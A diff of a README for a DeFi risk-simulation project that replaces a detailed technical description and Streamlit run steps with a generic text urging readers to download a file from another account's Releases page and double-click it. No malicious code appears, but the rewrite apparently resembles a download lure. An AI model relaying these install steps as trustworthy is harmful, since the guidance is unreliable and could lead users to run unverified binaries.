@@ -1,380 +1,82 @@
-# **DeFi-Risk-Scenario-Lab**
+# 🎉 Defi-Risk-Scenario-Lab - Stress-Test DeFi Protocols Efficiently
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Status-Active-success?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python&logoColor=white">
-  <img src="https://img.shields.io/badge/Solidity-0.8.20-black?style=for-the-badge&logo=solidity&logoColor=white">
-  <img src="https://img.shields.io/badge/Streamlit-App-red?style=for-the-badge&logo=streamlit&logoColor=white">
-  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Contributions-Welcome-orange?style=for-the-badge">
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-2b72a8)](https://github.com/WilliamWK21/Defi-Risk-Scenario-Lab/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/DeFi-Simulation-blueviolet?style=for-the-badge&logo=ethereum">
-  <img src="https://img.shields.io/badge/Risk-Modeling-critical?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Smart--Contracts-Research-important?style=for-the-badge">
-</p>
+## 🚀 Getting Started
 
-### *A Research-Grade Environment for Stress-Testing DeFi Protocols with Solidity Mini-Systems + Python Simulation Engine + Streamlit Visualization*
+Welcome to the Defi-Risk-Scenario-Lab! This application helps you simulate and understand how decentralized finance (DeFi) protocols react to various stress scenarios. With our easy-to-use interface, no programming knowledge is required.
 
----
+## 📦 Requirements
 
-## **Executive Summary**
+Before you start, ensure your system meets the following requirements:
 
-**DeFi-Risk-Scenario-Lab** is a full-stack analytical environment designed to **simulate, visualize, and explain the behavior of DeFi protocols under market stress**.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution.
+- **Python:** Version 3.7 or higher installed on your machine.
+- **Internet Connection:** Required for downloading and running the application.
 
-It integrates:
+## 💡 Features
 
-* **Miniature Solidity protocol implementations** (AMM, lending pool, yield system)
-* **A Python simulation backend** modeling price crashes, liquidity dynamics, and liquidation cascades
-* **A Streamlit dashboard** for real-time scenario exploration and visualization
-* **Quantitative risk metrics**: pool value, protocol equity, position health, and cascading effects
+- **Simulate Price Crashes:** Understand how significant price drops affect your investment.
+- **Liquidity Shift Analysis:** Investigate how changes in liquidity impact DeFi protocols.
+- **AMM Behavior Simulation:** Learn about Automated Market Maker dynamics.
+- **Lending Liquidation Scenarios:** Explore how liquidation works in lending protocols.
+- **Systemic Risk Dynamics:** Analyze the risks that can affect the entire DeFi ecosystem.
 
-This lab is intentionally designed for:
+## 💻 Installation
 
-* **DeFi protocol architects** exploring parameter sensitivities
-* **Smart-contract security researchers** analyzing failure modes
-* **Financial engineers** performing scenario & stress testing
-* **Data scientists** modeling systemic risks in on-chain economies
+### Download & Install
 
-It serves as a *sandbox for understanding risk propagation*, not as a production DeFi system.
+To get started, visit our [Releases page](https://github.com/WilliamWK21/Defi-Risk-Scenario-Lab/releases) to download the latest version of the software.
 
----
+1. Click on the link to the Releases page.
+2. Locate the latest version.
+3. Download the appropriate file for your system.
+4. Follow the included installation instructions.
 
-# **Why This Lab Exists**
+## 🖥️ Running the Application
 
-DeFi protocols, despite being autonomous and deterministic, remain vulnerable to:
+Once you have installed the application, you can easily run it:
 
-* market shocks
-* liquidity fragmentation
-* leverage spirals
-* oracle-dependent liquidation loops
-* fee misconfigurations
-* AMM inventory risk
-* cross-protocol contagion
+1. Find the application icon on your desktop or in your applications folder.
+2. Double-click the icon to launch the application.
+3. Follow the on-screen instructions to set up your simulation parameters.
+4. Explore the various features available to you.
 
-Traditional DeFi audits focus on **code correctness**, not **economic correctness**.
-This lab fills that gap by simulating:
+## 📊 Using the Dashboard
 
-### *“What happens to protocol state when the market breaks?”*
+After launching the application, you will see a dashboard that displays various options:
 
-Examples this lab answers:
+- **Configure Simulation:** Choose the type of simulation you want to run.
+- **View Results:** Analyze the simulation results to gain insights.
+- **Adjust Parameters:** Modify parameters based on your interests to perform custom simulations.
 
-* How fast does an AMM’s value deteriorate during a crash?
-* At what volatility levels does a lending pool enter liquidation spiral?
-* What parameter combinations (LTV, fees) create instability?
-* How do swap flows interact with falling collateral prices?
+## 🤝 Support
 
-The two figures you generated are the *first outputs of this investigation*.
+If you encounter any issues while downloading or running the application, feel free to reach out. Here are some common FAQs and how to solve issues:
 
----
+1. **I can't find the downloaded file. What should I do?**
+   - Check your Downloads folder or the location specified in your browser settings.
 
-## **Project Architecture**
+2. **The application won't open. What could be wrong?**
+   - Ensure that you have the required version of Python installed. If you have an outdated version, download the latest from the [Python website](https://www.python.org/).
 
-```
-DeFi-Risk-Scenario-Lab/
-│
-├── contracts/            # Solidity mini-protocols
-│   ├── amm/
-│   ├── lending/
-│   └── yield/
-│
-├── simulation/           # Python simulation engine
-│   ├── scenarios.py
-│   ├── protocols.py
-│   ├── engines.py
-│   ├── metrics.py
-│   └── state.py
-│
-├── app/
-│   └── streamlit_app.py  # UI Dashboard
-│
-├── tests/
-└── README.md
-```
+3. **What if I find a bug?**
+   - We appreciate your feedback. Please report bugs on the Issues section in our repository so we can address them promptly.
 
----
+## 📜 License
 
-# **System Architecture**
+This application is open-source and available under the MIT License. You can use, modify, and distribute the software following the terms of the license.
 
-The architecture is designed to be modular, interpretable, and extensible.
+## 🌱 Contribution
 
-## **1. Solidity Mini-Protocols (Specification Layer)**
+We welcome contributions from everyone. If you have ideas on how to improve the application or wish to add new features, feel free to fork the repository and submit a pull request.
 
-Lightweight smart contracts representing essential mechanics:
+## 🔗 Additional Resources
 
-* **SimpleAMM.sol**
+For more information on DeFi protocols and related concepts, consider the following resources:
 
-  * Uniswap v2-style x*y=k invariant
-  * Configurable swap fee
-  * No LP token complexity (for clarity)
+- **DeFi Basics:** An overview of decentralized finance.
+- **Python Programming for Simulation:** Beginner resources to learn Python if you're interested in customizing the simulations.
+- **Financial Modeling in DeFi:** Understanding the financial aspects of decentralized protocols.
 
-* **SimpleLendingPool.sol**
-
-  * Collateral-value-based health factor
-  * LTV (loan-to-value) limits
-  * Liquidation threshold
-  * Deterministic liquidation logic
-
-* **RewardFarm.sol**
-
-  * Linear emission
-  * Useful for modeling yield contraction during crashes
-
-These contracts provide the **ground-truth rule sets** that the Python engine mirrors mathematically.
-
----
-
-## **2. Python Simulation Engine (Dynamic Layer)**
-
-The simulation engine consists of:
-
-### **A. Market Generator**
-
-Creates price/shock paths:
-
-* Linear crashes
-* Multi-phase dumps
-* Liquidity drains (future feature)
-* Volatility spikes (planned)
-
-### **B. Protocol Mirrors**
-
-Re-implement Solidity logic in Python for speed:
-
-* AMM swaps adjust reserve state each timestep
-* Lending pool health evaluated continuously
-* Liquidations executed deterministically
-
-### **C. Metrics Module**
-
-Computes:
-
-* pool value = reserve₀ + reserve₁ × price
-* protocol equity
-* liquidation count
-* drawdown (planned)
-* impermanent loss (planned)
-
-### **D. Snapshot Collector**
-
-Every timestep records structured simulation state:
-
-```
-MarketState
-AMMState
-LendingState
-Metrics
-```
-
----
-
-## **3. Streamlit Dashboard (Visualization Layer)**
-
-The UI lets you:
-
-* configure crash depth, start, horizon
-* tweak LTV, liquidation threshold
-* adjust AMM fee behavior
-* execute simulation
-* visualize how AMM value and price evolve
-
-This turns analytical modeling into **interactive experimentation**.
-
----
-
-# **Core Figures**
-## **1. Price Trajectory Under Crash Scenario**
-
-<img width="727" height="393" alt="Screenshot 2025-11-25 at 15-52-16 Streamlit" src="https://github.com/user-attachments/assets/40d05813-7247-4769-8996-abbf2e8ba01c" />
-
-This chart shows:
-
-* A stable price plateau during the “calm” phase
-* A linear downward crash starting at timestep 10
-* A final stabilization at a lower price
-
-### **Interpretation**
-
-This is a *controlled price crash model*, ideal for studying deterministic protocol response.
-It isolates the following variables:
-
-* **Price levels**
-* **Rate of decline**
-* **Crash starting point**
-* **Shock duration**
-
-This makes the scenario analytically clean and easy to interpret.
-
----
-
-## **2. AMM Pool Value Response During Crash**
-
-<img width="736" height="403" alt="Screenshot 2025-11-25 at 15-52-35 Streamlit" src="https://github.com/user-attachments/assets/b9a49b9b-85dd-4dbe-9b45-6566efe7985f" />
-
-This chart shows:
-
-* A stable pool value until the crash begins
-* A gradual decline in AMM value as reserves rebalance
-* The characteristic *impermanent loss curve* induced by volatile price movement
-
-### **Interpretation**
-
-This figure demonstrates several canonical AMM behaviors:
-
-### **1. Inventory Risk**
-
-As price melts, the pool becomes overexposed to the losing asset.
-
-### **2. Impermanent Loss**
-
-Even if price later stabilizes, the AMM’s reserve ratio has shifted such that:
-
-```
-Pool Value < HODL Value
-```
-
-### **3. Swap-Induced Reserve Drift**
-
-Your simulation applies a constant trade size each timestep, modeling:
-
-* arbitrage
-* passive flow
-* user swap pressure
-
-This increases divergence between AMM and baseline value.
-
-### **4. Deterministic Value Decay**
-
-Because the AMM is a *function of price*, a predictable decline appears:
-
-```
-V_pool(t) = reserve₀(t) + reserve₁(t) × price(t)
-```
-
-Your simulation correctly exhibits:
-
-* concave decay
-* linear-like reserve depletion
-* no sudden discontinuities (as expected from AMM math)
-
----
-
-# **Mathematical Foundations**
-
-The simulation is driven by two classical DeFi equations:
-
----
-
-## **1. AMM (Uniswap v2) Constant Product Formula**
-
-```
-x * y = k
-```
-
-When a swap comes in:
-
-```
-amount_in_with_fee = amount_in × (1 – fee)
-new_reserve_in  = reserve_in + amount_in_with_fee
-new_reserve_out = k / new_reserve_in
-amount_out      = reserve_out - new_reserve_out
-```
-
-This determines:
-
-* price impact
-* reserve composition
-* pool value trajectory
-
----
-
-## **2. Lending Pool Health Factor**
-
-```
-health = collateral_value / debt
-```
-
-Liquidation condition:
-
-```
-health < liquidation_threshold
-  → trigger liquidation
-```
-
-In this simulation:
-
-* liquidations reduce collateral
-* reduce debt
-* increment liquidation counter
-
-Even though your current chart doesn’t show liquidations yet, the system is ready for them.
-
----
-
-# **How to Run the Lab**
-
-### **Install dependencies**
-
-```bash
-pip install streamlit
-```
-
-### **Run the dashboard**
-
-```bash
-streamlit run app/streamlit_app.py
-```
-
-Dashboard appears at:
-
-```
-http://localhost:8501
-```
-
----
-
-# **Next Extensions Built Into the Design**
-
-This repo is structured for future expansion:
-
-### Market Layer
-
-* GBM stochastic volatility
-* Flash crashes
-* Multi-asset contagion
-
-### Protocol Layer
-
-* Leverage loops
-* Cross-protocol interactions
-* Oracle lag models
-
-### Visualization Layer
-
-* Liquidation timeline
-* Health factor trajectory
-* Impermanent loss curve
-* AMM arbitrage efficiency
-
----
-
-# **Intended Audience**
-
-This lab is meant for:
-
-### **DeFi Engineers**
-
-Testing parameter sensitivity before launching mainnet protocols.
-
-### **Security Researchers**
-
-Understanding economic attack surfaces.
-
-### **Quants**
-
-Modeling deterministic stress behaviors.
-
-### **Data Scientists**
-
-Running reproducible simulations of on-chain risk.
+For further assistance and detailed documentation, return to our [Releases page](https://github.com/WilliamWK21/Defi-Risk-Scenario-Lab/releases).
